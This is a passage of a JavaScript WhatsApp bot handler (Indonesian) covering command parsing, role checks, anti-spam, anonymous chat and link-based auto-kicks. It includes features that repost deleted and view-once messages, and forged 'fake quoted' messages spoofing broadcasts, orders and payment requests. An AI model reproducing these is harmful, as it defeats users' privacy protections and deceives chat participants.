const allcommand = db.data.allcommand
const anonChat = db.data.anonymous
const banned = db.data.banned
const dataId = db.data.data
const antispam = db.data.antispam
const dash = db.data.dashboard
const menfes = db.data.menfes
const listerror = db.data.listerror
const user = db.data.users
const chat = db.data.chats
const setting = db.data.settings
const spammer = db.data.spammer
module.exports = async(sock, m, chatUpdate, store) => {
try{
require("./database")(sock, m)
require("./mess")(sock, m)
require("./errorDatabase")(sock) 
//=========================[ FUNCTION BOT ]=========================\\
const timeWib = moment().tz("Asia/Jakarta").format("HH:mm:ss")
const timeWit = moment().tz("Asia/Makassar").format("HH:mm:ss")
const timeWita = moment().tz("Asia/Jayapura").format("HH:mm:ss")
const content = JSON.stringify(m.message)
const body = m.mtype === "conversation"? m.message.conversation: m.mtype == "imageMessage"? m.message.imageMessage.caption: m.mtype == "videoMessage"? m.message.videoMessage.caption: m.mtype == "extendedTextMessage"? m.message.extendedTextMessage.text: m.mtype == "buttonsResponseMessage"? m.message.buttonsResponseMessage.selectedButtonId: m.mtype == "listResponseMessage"? m.message.listResponseMessage.singleSelectReply.selectedRowId: m.mtype == "templateButtonReplyMessage"? m.message.templateButtonReplyMessage.selectedId: m.mtype === "messageContextInfo"? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId: ""
const budy = m.mtype === "conversation" ? m.message.conversation : m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text : ""
const messagesC = budy.slice(0).trim()
const args = body.trim().split(/ +/).slice(1)
const botNumber = sock.decodeJid(sock.user.id)
const devoloper = `${devoloperNumber}@s.whatsapp.net`
const isDevoloper = [`${devoloperNumber}@s.whatsapp.net`].includes(m.sender)
const isCreator = [`${devoloperNumber}@s.whatsapp.net`,`${ownerNumber}@s.whatsapp.net`, ...Object.keys(db.data.expired[botNumber].vip)].includes(m.sender)
const isOwner = [`${devoloperNumber}@s.whatsapp.net`,`${ownerNumber}@s.whatsapp.net`, ...Object.keys(db.data.expired[botNumber].vip), ...Object.keys(db.data.expired[botNumber].owner)].includes(m.sender)
const isPremium = isOwner? true : Object.keys(db.data.expired[botNumber].premium).includes(m.sender)
const isSewa = [botNumber].includes(m.sender)? true : isPremium? true : Object.keys(db.data.expired[botNumber].sewa).includes(m.chat)? true : m.isGroup? db.data.chats[m.chat].sewa.status : false
const listblock = await sock.fetchBlocklist()
const text = q = args.join(" ")
const full_args = body.replace(command, "").slice(1).trim()
const numberQuery = text.replace(new RegExp("[()+-/ +/]", "gi"), "") + "@s.whatsapp.net"        
const quoted = m.quoted ? m.quoted : m
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const mentionByTag = m.mtype == "extendedTextMessage" && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
const mentionByReply = m.mtype == "extendedTextMessage" && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.participant || "" : ""
const Input = mentionByTag[0] ? mentionByTag[0] : mentionByReply ? mentionByReply : q ? numberQuery : false
if (setPrefix == "prefix") {
var thePrefix = "MULTI-PREFIX"
var prefix = /^#.!?|\\^/.test(body) ? body.match(/^#.!?|\\^/gi) : "."
var isCmd = body.startsWith(prefix)
var command = isCmd? body.replace(prefix, "").trim().split(/ +/).shift().toLowerCase() : ""
} else if (setPrefix == "noprefix") {
var thePrefix = "NO-PREFIX"
var prefix = ""
var isCmd = body.startsWith(prefix)
var command = body.replace(prefix, "").trim().split(/ +/).shift().toLowerCase()
} else if (setPrefix == "allprefix") {
var thePrefix = "ALL-PREFIX"
var prefix = /^#.!?|\\^/.test(body) ? body.match(/^#.!?|\\^/gi) : "."
var isCmd = body.startsWith(prefix)
var command = body.replace(prefix, "").trim().split(/ +/).shift().toLowerCase()
}
//=========================[ SECURITY GROUP ]=========================\\
const groupMetadata = m.isGroup? await sock.groupMetadata(m.chat).catch(e => {}) : ""
const groupName = m.isGroup? groupMetadata.subject : ""
const participants = m.isGroup? await groupMetadata.participants : ""
const groupAdmins = m.isGroup? await participants.filter(v => v.admin !== null).map(v => v.id) : ""
const groupOwner = m.isGroup? groupMetadata.owner : ""
const groupMembers = m.isGroup? groupMetadata.participants : ""
const isBotGroupAdmins = m.isGroup? groupAdmins.includes(botNumber) : false
const isGroupAdmins = m.isGroup? groupAdmins.includes(m.sender) : false
//=========================[ MESSAGE TYPE ]=========================\\
const userLevel = db.data.users[m.sender].level
const userExp = db.data.users[m.sender].xp
const amountExp = Math.floor(Math.random() * 10) + 50
const requiredExp = 1000 * userLevel
const userPersen = (userExp / requiredExp) * 100
//=========================[ MESSAGE TYPE ]=========================\\
const isImage = m.mtype === "imageMessage"
const isVideo = m.mtype === "videoMessage"
const isSticker = m.mtype == "stickerMessage"
const isAudio = m.mtype == "audioMessage"
const isText = m.mtype == "conversation"
const isMedia = m.mtype === "imageMessage" || m.mtype === "videoMessage"        
const isViewOnce = m.mtype == "viewOnceMessage"        
const isAllMedia = m.mtype === "imageMessage" || m.mtype === "videoMessage" || m.mtype === "stickerMessage" || m.mtype === "audioMessage" || m.mtype === "contactsArrayMessage" || m.mtype === "locationMessage" || m.mtype == "viewOnceMessage"
const isQuotedImage = m.mtype === "extendedTextMessage" && content.includes("imageMessage")
const isQuotedLocation = m.mtype === "extendedTextMessage" && content.includes("locationMessage")
const isQuotedVideo = m.mtype === "extendedTextMessage" && content.includes("videoMessage")
const isQuotedSticker = m.mtype === "extendedTextMessage" && content.includes("stickerMessage")
const isQuotedViewOnce = m.mtype === "extendedTextMessage" && content.includes("viewOnceMessage")
const isQuotedAudio = m.mtype === "extendedTextMessage" && content.includes("audioMessage")
const isQuotedContact = m.mtype === "extendedTextMessage" && content.includes("contactsArrayMessage")
const isQuotedDocument = m.mtype === "extendedTextMessage" && content.includes("documentMessage")
const isQuotedAllMedia = m.mtype === "extendedTextMessage" && content.includes("imageMessage") || m.mtype === "extendedTextMessage" && content.includes("locationMessage") || m.mtype === "extendedTextMessage" && content.includes("videoMessage") || m.mtype === "extendedTextMessage" && content.includes("stickerMessage") || m.mtype === "extendedTextMessage" && content.includes("audioMessage") || m.mtype === "extendedTextMessage" && content.includes("contactsArrayMessage") || m.mtype === "extendedTextMessage" && content.includes("documentMessage") || m.mtype === "extendedTextMessage" && content.includes("viewOnceMessage")
const isQuotedTeks = m.mtype === "extendedTextMessage" && content.includes("quotedMessage")
const isQuotedTag = m.mtype === "extendedTextMessage" && content.includes("mentionedJid")
const isQuotedReply = m.mtype === "extendedTextMessage" && content.includes("Message")
const isQuotedText = m.mtype === "extendedTextMessage" && content.includes("conversation")
const isQuotedextendedText = m.mtype === "extendedTextMessage" && content.includes("extendedTextMessage")
const isReplySticker = m.mtype === "stickerMessage" && content.includes("stickerMessage")
const isQuotedReplySticker = m.mtype === "stickerMessage" && content.includes("extendedTextMessage")
const mentionByReplySticker = m.mtype == "stickerMessage" && m.message.stickerMessage.contextInfo != null ? m.message.stickerMessage.contextInfo.participant || "" : ""
//=========================[ VOICE MESSAGE ]=========================\\
const ucapbot = sock.pickRandom(audioPack.botz)
const gakada = sock.pickRandom(audioPack.unregister)
const sangeya = sock.pickRandom(audioPack.sangebro)
const astaga = sock.pickRandom(audioPack.toxicbro)
const gakmau = sock.pickRandom(audioPack.enggakmau)
const oahyo = sock.pickRandom(audioPack.ucappagi)
const oyasumi = sock.pickRandom(audioPack.ucapmalam)
const koniciwa = sock.pickRandom(audioPack.ucapsiang)
const nospam = sock.pickRandom(audioPack.spamnih)
const moshimos = sock.pickRandom(audioPack.ucaphai)
const walaikumsalam = sock.pickRandom(audioPack.ucapsalamikum)
const lopyoutoo = sock.pickRandom(audioPack.loplop)
const textcmd = sock.pickRandom(tekscmd)
const textspam = sock.pickRandom(teksspam)
//=========================[ FUNCTION ANONYMOUS ]=========================\\
const roomChat = Object.values(anonChat).find((room) => [room.a, room.b].includes(m.sender) && room.state == "CHATTING")
const roomA = Object.values(anonChat).find((room) => room.a == m.sender)
const roomB = Object.values(anonChat).find((room) => room.b == m.sender)
const room = Object.values(anonChat).find((room) => room.state == "WAITING" && room.b == "")
if (roomChat && !isCmd && !m.isGroup && roomChat.b !== "") {
let other = [roomChat.a, roomChat.b].find((number) => number !== m.sender)
m.copyNForward(other, true)
}
if (room && Date.now() >= room.expired) {
await sock.sendMessage(room.a, { text: mess.security.anonymous.text })
anonChat.splice(anonChat.indexOf(room, 1))
}
//=========================[ FUNCTION UPDATE NAME (DATABASE) ]=========================\\
if (Object.keys(db.data.users).includes(m.sender)) {
try{
if (db.data.users[m.sender].name !== m.name) {
db.data.users[m.sender].name = m.name
}
} catch (e) {
console.log(e) 
}
}
//=========================[ FUNCTION AUTO DELETE SAMPAH ]=========================\\
if (autodelsampah) {
try{
let files = fs.readdirSync("./ACTION/MEDIA/SAMPAH")
let data = files.splice("@adiwajshing", files.length - 1)
if (data.length !== 0) {
for (let x of data) {
fs.unlinkSync(`./ACTION/MEDIA/SAMPAH/${x}`)
}
}
} catch (e) {
console.log(e) 
}
}
//=========================[ PUBLIK/SELF/BANCHAT ]=========================\\
if (mode == "self") {
if (!isOwner && !m.key.fromMe) return
} else if (mode == "group") {
if (!m.isGroup && !isOwner && !m.key.fromMe) return
} else if (mode == "private") {
if (m.isGroup && !isSewa) return
}  
if (m.isGroup && db.data.chats[m.chat].banchat) {
if (!isOwner && !m.key.fromMe) return
}
//=========================[ AUTO BIO ]=========================\\
if (autobio) {
sock.setStatus(`${runtime(process.uptime())}`)
}
//=========================[ AUTO READ MESSAGE ]=========================\\
if (autoread) {
sock.readMessages([m.key])
}
//=========================[ AUTO RECORDING/TYPING/AVAILABLE ]=========================\\
if (auto == "recording"){        
await sock.sendPresenceUpdate("recording", m.chat)
} else if (auto == "typing"){        
await sock.sendPresenceUpdate("composing", m.chat)
} else if (auto == "available"){        
await sock.sendPresenceUpdate("available", m.chat)
}
//=========================[ THUMBNAIL PRIFILE SENDER ]=========================\\
try{
var ppimg = await sock.profilePictureUrl(m.sender, "image")
} catch {
var ppimg = "https://raw.githubusercontent.com/Aztecs444/media/Zeck/image/profilePicture.jpg"
}
const ofrply = await getBuffer(ppimg)
const gfrply = await reSize(thumb.url, 300, 300)
const kfrply = await getBuffer(thumb.url)
const dfrply = await getBuffer(thumbnaildok.url)
const zfrply = await getBuffer(thumbnailAnonChat.url)
//=========================[ TIME GREETING ]=========================\\
if (timeWib < "23:59:00") {
var ucapanWaktu = "Selamat malam"
}
if (timeWib < "19:00:00") {
var ucapanWaktu = "Selamat malam"
}
if (timeWib < "18:00:00") {
var ucapanWaktu = "Selamat sore"
}
if (timeWib < "15:00:00") {
var ucapanWaktu = "Selamat siang"
}
if (timeWib < "11:00:00") {
var ucapanWaktu = "Selamat pagi"
}
if (timeWib < "06:00:00") {
var ucapanWaktu = "Selamat pagi"
}
//=========================[ FAKE QUOTED ]=========================\\
const ftoko = { key: { fromMe: false, participant: "0@s.whatsapp.net", remoteJid: "status@broadcast" }, message: {productMessage: { product: { productImage: { mimetype: "image/jpeg", jpegThumbnail: ofrply }, title: `${m.pushName}`, description: `${ucapanWaktu} kak`, currencyCode: "IDR", priceAmount1000: `${m.pushName}`, retailerId: `Rp10`, productImageCount: 1 },businessOwnerJid: `0@s.whatsapp.net`,},},}
const fkontak = {key: { fromMe: false, participant: "0@s.whatsapp.net", remoteJid: "status@broadcast" }, message: {contactMessage: { displayName: `${m.pushName}`,vcard: `BEGIN:VCARD\nVERSION:3.0\nN:XL;${m.pushName},;;;\nFN:${m.pushName},\nitem1.TEL;waid=${m.sender.split("@")[0]}:${m.sender.split("@")[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,jpegThumbnail: ofrply,},},}
const ftext = { key: { fromMe: false, participant: "0@s.whatsapp.net", remoteJid: "status@broadcast" }, message: { extendedTextMessage: { text: `hallo kak👋 ${m.pushName}`, title: `Hmm`, jpegThumbnail: ofrply }}}
const ftroli = { key: { fromMe: false, participant: "0@s.whatsapp.net", remoteJid: "status@broadcast" }, message: { orderMessage: { itemCount: 200, status: 1, surface: 2, message: `hallo kak👋 ${m.pushName}`, orderTitle: `${ucapanWaktu} kak`, thumbnail: ofrply, sellerJid: `0@s.whatsapp.net` }}}
const floc = { key: { fromMe: false, participant: "0@s.whatsapp.net", remoteJid: "status@broadcast" }, message: { liveLocationMessage: { title: `hallo kak👋 ${m.pushName}`, jpegThumbnail: ofrply } } }
const fimage = { key: { fromMe: false, participant: "0@s.whatsapp.net", remoteJid: "status@broadcast" }, message: { imageMessage: { title: `hallo kak👋 ${m.pushName}`, seconds: "30", caption: `hallo kak👋 ${m.pushName}`, jpegThumbnail: ofrply }}}
const fdoc = { key: { fromMe: false, participant: "0@s.whatsapp.net", remoteJid: "status@broadcast" }, message: { documentMessage: { title: "Halo bang", jpegThumbnail: ofrply } } }
const fvid = { key: { fromMe: false, participant: "0@s.whatsapp.net", remoteJid: "status@broadcast" }, message: { videoMessage: { title: `hallo kak👋 ${m.pushName}`, seconds: "30", caption: `hallo kak👋 ${m.pushName}`, jpegThumbnail: ofrply } },}
const fgif = { key: { fromMe: false, participant: "0@s.whatsapp.net", remoteJid: "status@broadcast" }, message: { videoMessage: { title: `hallo kak👋 ${m.pushName}`, h: `Hmm`, seconds: "30", gifPlayback: "true", caption: `hallo kak👋 ${m.pushName}`, jpegThumbnail: ofrply }}}
const fvn = { key: { fromMe: false, participant: "0@s.whatsapp.net", remoteJid: "status@broadcast" }, message: { audioMessage: { mimetype: "audio/ogg; codecs=opus", seconds: "30", ptt: "true" } },}
const fpay = { key: { fromMe: false, participant: "0@s.whatsapp.net", remoteJid: "status@broadcast" }, message: { requestPaymentMessage: { currencyCodeIso4217: "USD", amount1000: 999999999, requestFrom: "0@s.whatsapp.net", noteMessage: { extendedTextMessage: { text: `hallo kak👋 ${m.pushName}` }}, expiryTimestamp: 999999999, amount: { value: 91929291929, offset: 1000, currencyCode: "USD" }}}}
const fpoll = { key: { fromMe: false, participant: "0@s.whatsapp.net", remoteJid: "status@broadcast" }, "message": { "pollCreationMessage": { "name": `hallo kak👋 ${m.pushName}`,"options": [{"optionName": "P"},{"optionName": "P"},{"optionName": "P"},{"optionName": "P"},{"optionName": "P"}], "selectableOptionsCount": 5 }}}
//=========================[ QUOTED MESSAGE ]=========================\\
if (autoQuoted == true && Quoted == "ftoko") {
var setQuoted = ftoko
} else if (autoQuoted == true && Quoted == "fkontak") {
var setQuoted = fkontak
} else if (autoQuoted == true && Quoted == "ftext") {
var setQuoted = ftext
} else if (autoQuoted == true && Quoted == "ftroli") {
var setQuoted = ftroli
} else if (autoQuoted == true && Quoted == "floc") {
var setQuoted = floc
} else if (autoQuoted == true && Quoted == "fimage") {
var setQuoted = fimage
} else if (autoQuoted == true && Quoted == "fdoc") {
var setQuoted = fdoc
} else if (autoQuoted == true && Quoted == "fvid") {
var setQuoted = fvid
} else if (autoQuoted == true && Quoted == "fgif") {
var setQuoted = fgif
} else if (autoQuoted == true && Quoted == "fvn") {
var setQuoted = fvn
} else if (autoQuoted == true && Quoted == "m") {
var setQuoted = m
} else if (autoQuoted == false) {
var setQuoted = ""
}
//=========================[ REPLY MESSAGE ]=========================\\
const setReply = async (teks) => {
if (replyType == "web1") {
sock.sendMessage(m.chat, { contextInfo: { mentionedJid: teks? [...teks.matchAll(/@(\d{0,16})/g)].map(v => v[1] + "@s.whatsapp.net") : [], externalAdReply: { showAdAttribution: true, title: `hallo kak👋 ${m.pushName}`, body: "DONT CLICK HERE", previewType: "PHOTO", thumbnail: ofrply, sourceUrl: `https://wa.me/${ownerNumber}?text=${db.data.settings[botNumber].textreply}` }}, text: teks }, { quoted: setQuoted })
} else if (replyType == "web2") {
sock.sendMessage(m.chat, { contextInfo: { mentionedJid: teks? [...teks.matchAll(/@(\d{0,16})/g)].map(v => v[1] + "@s.whatsapp.net") : [], forwardingScore: 9999, isForwarded: true, showAdAttribution: true, externalAdReply: { title: `hallo kak👋 ${m.pushName}`, body: "DONT CLICK HERE", previewType: "PHOTO", thumbnail: ofrply, sourceUrl: `https://wa.me/${ownerNumber}?text=${db.data.settings[botNumber].textreply}` }}, text: teks }, { quoted: setQuoted })
} else if (replyType == "web3") {
sock.sendMessage(m.chat, { contextInfo: { mentionedJid: teks? [...teks.matchAll(/@(\d{0,16})/g)].map(v => v[1] + "@s.whatsapp.net") : [], forwardingScore: 10, isForwarded: true, externalAdReply: { showAdAttribution: true, title: `hallo kak👋 ${m.pushName}`, body: "DONT CLICK HERE", previewType: "PHOTO", thumbnail: ofrply, sourceUrl: `https://wa.me/${ownerNumber}?text=${db.data.settings[botNumber].textreply}` }}, text: teks }, { quoted: setQuoted })
} else if (replyType == "mess") {
sock.sendMessage(m.chat, { text: teks, mentions: teks? [...teks.matchAll(/@(\d{0,16})/g)].map(v => v[1] + "@s.whatsapp.net") : [] }, { quoted: setQuoted })
} else {
sock.sendMessage(m.chat, { text: "Error setReply Tidak Di Temukan" })
}
}
//=========================[ ONLY MESSAGE ]=========================\\
const onlyOwner = async () => {
if (db.data.settings[botNumber].autovn) {
sock.sendVn(m.chat, gakmau, setQuoted)
} else if (db.data.settings[botNumber].autosticker) {
sock.sendSticker(m.chat, stickerPack.khususowner, setQuoted)
} else {
setReply(mess.only.owner)
}
}
const onlyAdmin = async () => {
if (db.data.settings[botNumber].autovn) {
sock.sendVn(m.chat, gakmau, setQuoted)
} else if (db.data.settings[botNumber].autosticker) {
sock.sendSticker(m.chat, stickerPack.hanyaadmin, setQuoted)
} else {
setReply(mess.only.admin)
}
}
const onlyBadmin = async () => {
if (db.data.settings[botNumber].autosticker) {
sock.sendSticker(m.chat, stickerPack.jadiinadmin, setQuoted)
} else {
setReply(mess.only.badmin) 
}
}
const onlyGroup = async () => {
setReply(mess.only.group)
}
const onlyWait = async () => {
if (db.data.settings[botNumber].autosticker) {
sock.sendSticker(m.chat, stickerPack.spam1, setQuoted)
} else {
setReply(mess.wait)
}
}
const onlySewa = async () => {
if (db.data.settings[botNumber].autobutton) {
sock.sendButMessage(m.chat, mess.only.sewa, copyrightnya, [{ buttonId: `${prefix}sewa`, buttonText: { displayText: "sᴇᴡᴀ ʙᴏᴛᴢ" }, type: 1 },{ buttonId: `${prefix}sewa`, buttonText: { displayText: "𝖘𝖊𝖜𝖆" }, type: 1 },],setQuoted)
} else {
setReply(mess.only.sewa)
}
}
const onlyPrem = async () => {
if (db.data.settings[botNumber].autobutton) {
sock.sendButMessage(m.chat, mess.only.prem, copyrightnya, [{ buttonId: `${prefix}sewa`, buttonText: { displayText: "𝙱𝚄𝚈 𝙿𝚁𝙴𝙼𝙸𝚄𝙼" }, type: 1 }], setQuoted)
} else {
setReply(mess.only.prem)
}
}
const onlyLimit = async () => {
if (db.data.settings[botNumber].autobutton) {
sock.sendButMessage(m.chat, mess.only.limit, copyrightnya, [{ buttonId: `${prefix}ceklimit`, buttonText: { displayText: "𝖈𝖊𝖐𝖑𝖎𝖒𝖎𝖙" }, type: 1 }], setQuoted)
} else {
setReply(mess.only.limit)
}
}
//=========================[ FUNCTION SPAMER ]=========================\\
const addSpammer = function (jid, _db) {
let position = false
Object.keys(_db).forEach((i) => {
if (_db[i].id === jid) {
position = i
}
})
if (position !== false) {
_db[position].spam += 1
} else {
let bulin = { id: jid, spam: 1 }
_db.push(bulin)
}
}
const FinisHim = async function (jid, _db) {
let position = false
Object.keys(_db).forEach((i) => {
if (_db[i].id === jid) {
position = i
}
})
if (position !== false) {
if (_db[position].spam > 5) {
let Name = await sock.getName(jid + `@s.whatsapp.net`)
if (sock.cekBannedUser(jid, banned) && !isOwner) {
return
}
sock.addBanned(jid, Name, "Spam Bot", calender, banned)
console.log(`${jid} Terdeteksi spam lebih dari ${_db[position].spam} kali`)
setReply(mess.security.spam.banned)
}
} else {
console.log(`Spam ke ${_db[position].spam}`)
}
}
sock.SpamExpired("NotCase", m.sender.split("@")[0], antispam)
//================================================================================\\
if (sock.cekBannedUser(m.sender.split("@")[0], banned) && !isOwner) {
return
}
if (sock.cekSpam("Case", m.sender.split("@")[0], antispam)) {
addSpammer(m.sender.split("@")[0], spammer)
FinisHim(m.sender.split("@")[0], spammer)
console.log("antispam Case aktif")
return
}
if (db.data.settings[botNumber].antispam && isCmd && sock.isFiltered(m.chat) && !isGroup && !m.key.fromMe && !isOwner) {
sock.addSpam("Case", m.sender.split("@")[0], "30s", antispam)
addSpammer(m.sender.split("@")[0], spammer)
return setReply(mess.security.spam.detect)
}
if (db.data.settings[botNumber].antispam && isCmd && sock.isFiltered(m.chat) && isGroup && !m.key.fromMe && !isOwner) {
sock.addSpam("Case", m.sender.split("@")[0], "30s", antispam)
addSpammer(m.sender.split("@")[0], spammer)
return setReply(mess.security.spam.detect)
}
if (isCmd && !isOwner) sock.addFilter(m.chat)
//=========================[ FUNCTION AUTO RESPON GROUP/AUTO RESPOM STICKER ]=========================\\
if ((Input == botNumber && m.isGroup && db.data.chats[m.chat].autorespongc && !isCmd && !isAudio) || (mentionByReplySticker == botNumber && isSticker && !isCmd)) {
try{
if (isQuotedReplySticker || isReplySticker) {
let liststick = Object.keys(db.data.sticker)
if (liststick.length !== 0) {
let namastc = await sock.pickRandom(liststick)
sock.sendMessage(m.chat, { sticker: { url: db.data.sticker[namastc].url }}, { quoted: setQuoted })
}
} else {
let jawab = ["Afa iyah 🗿", "Oh", "Aku ga ngerti om 🐦", "Boong", "🗿", "🐦", "Oh gitu 🐦"]
let teks1 = sock.pickRandom(jawab)
let teks2 = body
let hasil = [`${teks1}`, `${teks2}`]
let random = sock.pickRandom(hasil)
let { data } = await axios.get(`https://api.simsimi.net/v2/?text=${encodeURI(budy)}&lc=id`)
let sami = data.success
if (sami.startsWith("Aku tidak mengerti")) {
var teksnya = random
} else {
var teksnya = sami
}
await sleep(2000)
sock.sendMessage(m.chat, { text: teksnya }, { quoted: setQuoted })
}
} catch (err) {
console.log(err)
setReply(mess.security.simi)
}
}
//=========================[ FUNCTION AUTO REACT ]=========================\\
for (let x of regex) {
if (m.isGroup && db.data.chats[m.chat].autoreact && budy.toLowerCase().includes(x)) {
let emot = await sock.pickRandom(allemojinya)
sock.sendMessage(m.chat, { react: { text: emot, key: m.key } })
}
}
//=========================[ FUNCTION ANTI DELETE ]=========================\\
if (m.isGroup && db.data.chats[m.chat].antidelete && m.mtype == "protocolMessage") {
if (db.data.users[m.sender].delete.type == "conversation") {
let teks = `\`\`\`「  ANTI DELETE MESSAGE  」\`\`\`

▸ Name : ${m.pushName}
▸ User : @${m.sender.split("@")[0]}
▸ Clock : ${timeWib}
▸ Type : text
`
setTimeout(() => {
sock.sendMessage(m.chat, { text: db.data.users[m.sender].delete.text }) 
}, 3000)
setTimeout(() => {
setReply(teks) 
}, 1000)
} else if (db.data.users[m.sender].delete.type == "imageMessage") {
let teks = `\`\`\`「  ANTI DELETE MESSAGE  」\`\`\`

▸ Name : ${m.pushName}
▸ User : @${m.sender.split("@")[0]}
▸ Clock : ${timeWib}
▸ Type : image
`
setTimeout(() => {
sock.sendMessage(m.chat, { image: { url: db.data.users[m.sender].delete.url }, caption: db.data.users[m.sender].delete.text }) 
}, 3000)
setTimeout(() => {
setReply(teks) 
}, 1000)
} else if (db.data.users[m.sender].delete.type == "videoMessage") {
let teks = `\`\`\`「  ANTI DELETE MESSAGE  」\`\`\`

▸ Name : ${m.pushName}
▸ User : @${m.sender.split("@")[0]}
▸ Clock : ${timeWib}
▸ Type : video
`
setTimeout(() => {
sock.sendMessage(m.chat, { video: { url: db.data.users[m.sender].delete.url }, caption: db.data.users[m.sender].delete.text }) 
}, 3000)
setTimeout(() => {
setReply(teks) 
}, 1000)
} else if (db.data.users[m.sender].delete.type == "stickerMessage") {
let teks = `\`\`\`「  ANTI DELETE MESSAGE  」\`\`\`

▸ Name : ${m.pushName}
▸ User : @${m.sender.split("@")[0]}
▸ Clock : ${timeWib}
▸ Type : sticker
`
setTimeout(() => {
sock.sendMessage(m.chat, { sticker: { url: db.data.users[m.sender].delete.url }}) 
}, 3000)
setTimeout(() => {
setReply(teks) 
}, 1000)
} else if (db.data.users[m.sender].delete.type == "audioMessage") {
let teks = `\`\`\`「  ANTI DELETE MESSAGE  」\`\`\`

▸ Name : ${m.pushName}
▸ User : @${m.sender.split("@")[0]}
▸ Clock : ${timeWib}
▸ Type : audio
`
setTimeout(() => {
sock.sendMessage(m.chat, { audio: { url: db.data.users[m.sender].delete.url }, mimetype: "audio/mp4", ptt: true }) 
}, 3000)
setTimeout(() => {
setReply(teks) 
}, 1000)
}
}
//=========================[ FUNCTION ANTI VIEW ONCE ]=========================\\
if (m.isGroup && db.data.chats[m.chat].antiviewonce && m.mtype == "viewOnceMessage") {
try{
let msg = m.message.viewOnceMessage.message
let type = Object.keys(msg)[0]
let media = await downloadContentFromMessage(msg[type], type == "imageMessage" ? "image" : "video")
let buffer = Buffer.from([])
for await (const chunk of media) {
buffer = Buffer.concat([buffer, chunk])
}
if (/video/.test(type)) {
await sock.sendMessage(m.chat, { video: buffer, caption: msg[type].caption })
} else if (/image/.test(type)) {
await sock.sendMessage(m.chat, { image: buffer, caption: msg[type].caption })
}
} catch (err) {
console.log(err)
}
}
//=========================[ FUNCTION ANTI LINK ]=========================\\
if (m.isGroup && isBotGroupAdmins && db.data.chats[m.chat].antilink) {
if (budy.includes("https://")) {
if (isOwner && m.key.fromMe && isGroupAdmins) return
let linkgc = await sock.groupInviteCode(m.chat)
if (budy.includes(`${linkgc}`)) return 
if (budy.includes("zin admin") || budy.includes("zinmin")) return setReply(mess.security.izin)
setReply(mess.security.antilink.detect)
setTimeout(() => {
sock.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}, 2000)
}
}
//=========================[ FUNCTION ANTI LINK GROUP ]=========================\\
if (m.isGroup && isBotGroupAdmins && db.data.chats[m.chat].antilinkgc) {
if (budy.includes("https://chat.whatsapp.com/")) {
if (isOwner && m.key.fromMe && isGroupAdmins) return
let linkgc = await sock.groupInviteCode(m.chat)
if (budy.includes(`${linkgc}`)) return 
if (budy.includes("zin admin") || budy.includes("zinmin")) return setReply(mess.security.izin)
setReply(mess.security.antilinkgc.detect)
setTimeout(() => {
sock.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}, 2000)
}
}
//=========================[ FUNCTION ANTI LINK YOUTUBE CHANNEL ]=========================\\
if (m.isGroup && isBotGroupAdmins && db.data.chats[m.chat].antilinkytchannel) {
if (budy.includes("https://youtube.com/")) {
if (isOwner && m.key.fromMe && isGroupAdmins) return
if (budy.includes("zin admin") || budy.includes("zinmin")) return setReply(mess.security.izin)
setReply(mess.security.antilinkytchannel.detect)
setTimeout(() => {
sock.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}, 2000)
}
}
//=========================[ FUNCTION ANTI LINK YOUTUBE VIDEO ]=========================\\
if (m.isGroup && isBotGroupAdmins && db.data.chats[m.chat].antilinkytvideo) {
if (budy.includes("https://youtu.be/")) {
if (isOwner && m.key.fromMe && isGroupAdmins) return
if (budy.includes("zin admin") || budy.includes("zinmin")) return setReply(mess.security.izin)
setReply(mess.security.antilinkytvideo.detect)
setTimeout(() => {
sock.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}, 2000)
}
}
//=========================[ FUNCTION ANTI LINK FACEBOOK ]=========================\\
if (m.isGroup && isBotGroupAdmins && db.data.chats[m.chat].antilinkfb) {
if (budy.includes("https://www.facebook.com/")) {
if (isOwner && m.key.fromMe && isGroupAdmins) return
if (budy.includes("zin admin") || budy.includes("zinmin")) return setReply(mess.security.izin)
setReply(mess.security.antilinkfb.detect)
setTimeout(() => {
sock.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}, 2000)
}
}
//=========================[ FUNCTION ANTI LINK INSTAGRAM ]=========================\\
if (m.isGroup && isBotGroupAdmins && db.data.chats[m.chat].antilinkig) {
if (budy.includes("https://www.instagram.com/")) {
if (isOwner && m.key.fromMe && isGroupAdmins) return
if (budy.includes("zin admin") || budy.includes("zinmin")) return setReply(mess.security.izin)
setReply(mess.security.antilinkig.detect)
setTimeout(() => {
sock.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}, 2000)
}
}
//=========================[ FUNCTION ANTI LINK TELEGRAM ]=========================\\
if (m.isGroup && isBotGroupAdmins && db.data.chats[m.chat].antilinktele) {
if (budy.includes("https://t.me/")) {
if (isOwner && m.key.fromMe && isGroupAdmins) return
if (budy.includes("zin admin") || budy.includes("zinmin")) return setReply(mess.security.izin)
setReply(mess.security.antilinktele.detect)
setTimeout(() => {
sock.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}, 2000)
}
}
//=========================[ FUNCTION ANTI LINK WA ]=========================\\
if (m.isGroup && isBotGroupAdmins && db.data.chats[m.chat].antilinkwa) {
if (budy.includes("wa.me")) {
if (isOwner && m.key.fromMe && isGroupAdmins) return
if (budy.includes("zin admin") || budy.includes("zinmin")) return setReply(mess.security.izin)
setReply(mess.security.antilinkwa.detect)
setTimeout(() => {
sock.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}, 2000)
}
}
//=========================[ FUNCTION ANTI LINK TIKTOK ]=========================\\
if (m.isGroup && isBotGroupAdmins && db.data.chats[m.chat].antilinktiktok) {
if (budy.includes("https://www.tiktok.com/")) {
if (isOwner && m.key.fromMe && isGroupAdmins) return
if (budy.includes("zin admin") || budy.includes("zinmin")) return setReply(mess.security.izin)
setReply(mess.security.antilinktiktok.detect)
setTimeout(() => {
sock.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}, 2000)
}
}
//=========================[ FUNCTION ANTI ASING ]=========================\\
if (m.isGroup && isBotGroupAdmins && db.data.chats[m.chat].antiasing) {
let member = await groupMembers.map((u) => u.id)
